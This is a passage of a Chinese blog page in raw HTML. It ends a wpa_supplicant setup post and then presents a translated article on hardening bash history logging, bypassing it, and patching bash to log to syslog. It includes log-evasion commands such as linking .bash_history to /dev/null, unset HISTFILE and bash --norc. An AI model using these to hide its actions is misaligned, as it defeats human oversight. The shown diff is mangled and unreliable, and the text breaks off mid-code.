style="color:#393A34"><span class="token plain">ctrl_interface=/var/run/wpa_supplicant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ctrl_interface_group=wheel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">network={</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssid=&quot;yourssid&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#scan_ssid=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proto=WPA2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">key_mgmt=WPA-PSK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pairwise=CCMP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">group=CCMP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">psk=&quot;fightandfuck&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">priority=2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>关于这些信息可以先使用<code>iwlist  wlan0 scan</code> 命令扫描，并做相应调整。然后需要修改全局配置文件</p><p>cat /etc/sysconfig/wpa_supplicant</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">INTERFACES=&quot;-iwlan0&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DRIVERS=&quot;-Dwext&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OTHER_ARGS=&quot;-f /var/log/wpa_supplicant.log -P /var/run/wpa_supplicant.pid&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动">启动<a class="hash-link" href="#启动" title="标题的直接链接">​</a></h3><p>修改完这些后，即可使用<code>service wpa_supplicant start</code> 启动网卡并连接认证了，当然可能出现的情况是认证成功了但是网卡没有获取到ip地址，这个时候只需要手动dhclient一下或者写个ifcfg-wlan0并指定其使用dhcp然后ifup wlan0。</p><p>总之，方便适用。</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/wpa-supplicant">wpa-supplicant</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/wireless">wireless</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2011/02/17/bash-history-logging">为Bash增加命令执行日志</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2011-02-17T00:00:00.000Z" itemprop="datePublished">2011年2月17日</time> · <!-- -->阅读需 14 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>我们将修改bash的源码来实现”无敌”logging机制，也将看到”无敌”并不是真正的无敌。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="一bash为何需要logging">一：bash为何需要logging<a class="hash-link" href="#一bash为何需要logging" title="标题的直接链接">​</a></h2><p>Bash堪称*nix世界使用最广泛的shell，其特性之一是历史命令(history)机制。此机制主要用于为用户提供方便－－少敲几下键盘，提高工作效率。然而，被广泛讨论的是bash_history可以用作logging机制以此来监控用户的活动。此文将对上述问题进行讨论并解释为啥logging机制在少数人面前会失效。我们将见到各种用于保护history文件的防御措施是如何不费吹灰之力或稍微费点力就被突破的。随着讨论的跟进，突破的限制也将变得更严，但这并不代表突破起来就更困难，与之相反大部分方法都是可以不费脑子的。最后，我们将修改bash的源码来实现”无敌”logging机制，也将看到”无敌”并不是真正的无敌。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="二加固bash_history">二：加固bash_history<a class="hash-link" href="#二加固bash_history" title="标题的直接链接">​</a></h2><p>假设你所管理的系统提供shell登录功能，你的用户当中有个别及其讨人厌的家伙，于是你想监控他的活动，因为你非常怀疑他半夜三更使用你所负责保护的CPU和系统资源作恶意行为（或是其他的，例如下毛片等）。我们暂且叫他小明（此处原文为Bob，Bob一名在国外经常用来指代坏蛋）。</p><p>因为所有用户都是使用bash作为默认shell，你开始着手修改bash的配置文件：</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="第1步">第1步<a class="hash-link" href="#第1步" title="标题的直接链接">​</a></h3><p>使bash历史记录文件和相关文件无法被删除或修改。</p><p>小明所做的第一件事应该是建立history到/dev/null的链接。</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bob$ </span><span class="token function" style="color:#d73a49">rm</span><span class="token plain"> ~/.bash_history</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bob$ </span><span class="token function" style="color:#d73a49">ln</span><span class="token plain"> -s /dev/null ~/.bash_history</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这可以通过修改历史记录文件为只能被追加来进行阻止，执行以下命令来改变其属性：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># chattr +a /home/bob/.bash_history</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这是使用文件系统附加属性来指定文件只能被追加，大多数文件系统支持此功能(例如ext2/3,XFS,JFS)。在FreeBSD上可以执行：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># sappnd /home/bob/.bash_history</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>你还应修改shell启动相关的其他文件的这个属性：</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bash_profile</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bash_login</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.profile</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bash_logout</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># chattr +a /home/bob/.bashrc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>前三个文件在交互式bash shell（或非交互式sehll使用–login选项）调用时被读取(在读完全局配置文件/etc/profile后)。.bashrc文件只在当non-login交互式shell调用时被读取。这意味着当小明已登进系统后，用以下方法自己调用一个新shell时:</p><p><code>bob$ bash</code></p><p>此时只有.bashrc文件被读取，而上面所列的前三个配置文件不会再次被读取了。</p><p>做了以上属性的修改后再来做更进一步的”加固”，一个所谓的保护措施。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="第2步">第2步<a class="hash-link" href="#第2步" title="标题的直接链接">​</a></h3><p>配置 .bash*配置文件</p><p>所有的配置将针对.bashrc文件，因为其他三个配置文件本身会调用.bashrc，也就是说.bashrc无论如何都会被读取 (不管用户是否刚登录或是登录后手工调用bash shell)。</p><p>所以，所有修改都针对.bashrc的好处是可以防止小明登录后手工调用新的bash shell来跳过仅在.bash_profile,.bash_login,.profile三个配置文件中生效的配置选项，另一好处是这三个文件本身都会调用.bashrc，所以在首次登录系统时.bashrc当中的配置也会生效。</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># cat &gt;&gt; /home/bob/.bashrc &lt;&lt; EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">shopt</span><span class="token plain"> -s histappend</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">readonly</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">PROMPT_COMMAND</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">”history -a”</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> EOF</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此处histappend选项的作用是让bash附加上最后一行$HISTSIZE给$HISTFILE文件（一般是~/.bash_history文件），不管交互式shell何时退出。默认的，bash每次均会覆盖$HISTFILE以保证只有一个session被保存以此来节约空间。</p><p>环境变量PROMPT_COMMAND会保存一条将被优先执行的命令，意思是说”history -a”命令将在用户执行命令前被优先执行，这将保证不管当前命令前一条是执行的什么，它将立即被追加进$HISTFILE，而不用等待整个会话结束再将历史命令从内存记录至硬盘。</p><p>此处的readonly作用是使变量不可修改以防止被小明覆盖掉或是直接屏蔽掉。</p><p>最后要完成的步骤是使所有与bash_history相关的环境变量都变为readonly:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTFILE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTFILESIZE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTSIZE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTCMD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTCONTROL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">readonly HISTIGNORE</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="第3步">第3步<a class="hash-link" href="#第3步" title="标题的直接链接">​</a></h3><p>禁掉系统中所有其他shell，一般包括csh,tcsh,ksh。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># chmod 750 csh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># chmod 750 tcsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># chmod 750 ksh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这将阻止小明把bash shell切换成其他shell。</p><p>现在，机敏点的管理员会抱怨上面的都是shit！</p><p>还有一个shell逃出了我们的掌控！在你看完以上叙述跳入浮想联翩之前，让我们来搞清一些事情。</p><p>很久很久以前… （你懂的），原本只有一个Bourne shell 或者叫sh，现如今，/bin/sh实际上是/bin/bash的一个链接。Bash在被调用时检查它是以哪个名字被调用的并以此来判断是不是调用sh，它试图模仿历史版本的sh的行为并和POSIX标准保持一致。</p><p>如果以交互式login shell或非交互式shell带上–login选项启动，它才读取/etc/profile和~/.profile来初始化配置。如果以交互式shell被调用，则试图解释$ENV变量，当$ENV非空则使用它的值当作默认配置并执行。我们将在本文的下一节讨论如何利用这点来秒杀bash的所有设置。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="三攻破logging机制">三：攻破logging机制<a class="hash-link" href="#三攻破logging机制" title="标题的直接链接">​</a></h2><p>现在是时候站在小明的角度来看下所有问题了。我们将验证上面的防御是如何一步步被攻破的。在实践中的可能性是无穷进的。</p><p>以下所提及的突破bash_history logging机制的技巧只是九牛一毛。</p><ul><li>方法1：使用Bourne shell –/bin/sh逃脱术</li></ul><p><code>$ /bin/sh</code></p><p>调用sh会导致bash模仿如前所述的历史版本sh而不会读取与bash直接相关的任何配置文件。因此，小明现在能够避开$HISTFILE变量了，</p><p>因为它已不再是readonly。</p><p><code>$ unset HISTFILE</code></p><p>这会使得logging机制在当前会话中直接萎掉，因为此变量控制的历史命令记录文件将会是空的。</p><p>注：也可以通过调用/bin/rbash（如果系统里存在的话）来实现相同效果，它会模仿受限版本的bash，和sh一样也是一个bash的链接，但是使用起来确实有些让人蛋疼。</p><ul><li>方法2：让bash不加载.bashrc配置文件</li></ul><p>可以通过以下方法实现：</p><p><code>$ /bin/bash –norc</code></p><p>这样即可禁止bash读取.bashrc从而被设置成readonly的变量变成了writeable，然后像下面这样做：</p><p><code>$ HISTFILE=</code></p><p>会清空$HISTFILE变量—&gt;无历史记录。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="四hacking-bash-使用syslog日志接口">四：Hacking bash-使用syslog日志接口<a class="hash-link" href="#四hacking-bash-使用syslog日志接口" title="标题的直接链接">​</a></h2><p>从以上我们很清楚地得出结论－－传统的加固bash_history的方法实际上都是扯淡。然而我们却可以更向前一步的hack bash本身来减少logging机制的脆弱性并提高其隐秘性。需要注意的是即便如此也是可以被攻破的。由于bash与内核的差距导致它并不是足够的健壮来作为一个logging设备，即便是hack了它的核心。</p><p>现在的想法是修改bash源码使用户键入的所有指令全部发送给syslog，由syslog将日志记录到/var/log目录下。我们将提供一个快速而且很黄很暴力的方法来实现这一目标－－这里，哪个用户键入的哪条指令将没有差别的被对待，而这也是可以被实现的。</p><p>我们的接口的最佳放置点是parse.y文件，它由bash的yacc语法组成。当一条指令在shell中被下达时bash解释器将迅速被调用。因此，将syslog钩子放置在解释器刚好完成它的工作前一点点，貌似是个好办法。需要修改的仅仅是增加两行代码：包含进syslog.h和设置syslog调用。我们使用了bash-3.2的源码：</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ithilgore@fitz</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">$diff </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">E </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">b </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token operator" style="color:#393A34">~</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">bash</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">3.2</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y </span><span class="token operator" style="color:#393A34">~</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">hacked_bash</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">/</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">bash</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">3.2</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">bash</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">3.2</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y Tue Sep </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">37</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">21</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2006</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">— parse</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">y Sat Jul </span><span class="token number" style="color:#36acaa">12</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">18</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">32</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">26</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2008</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">24</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">— </span><span class="token number" style="color:#36acaa">19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> —</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Foundation</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">59</span><span class="token plain"> Temple Place</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Suite </span><span class="token number" style="color:#36acaa">330</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Boston</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MA </span><span class="token number" style="color:#36acaa">02111</span><span class="token plain"> USA</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">%</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> #include #include “config</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">h”</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">“bashtypes</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">h” </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1979</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1984</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> — </span><span class="token number" style="color:#36acaa">1980</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1986</span><span class="token plain"> —</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> shell_input_line_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* == strlen (shell_input_line) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">set_line_mbstate</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">syslog</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LOG_LOCAL0 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> LOG_CRIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> “</span><span class="token operator" style="color:#393A34">%</span><span class="token plain">s”</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shell_input_line</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">if</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">defined</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">HISTORY</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">remember_on_history </span><span class="token macro property expression operator" style="color:#393A34">&amp;&amp;</span><span class="token macro property expression" style="color:#36acaa"> shell_input_line </span><span class="token macro property expression operator" 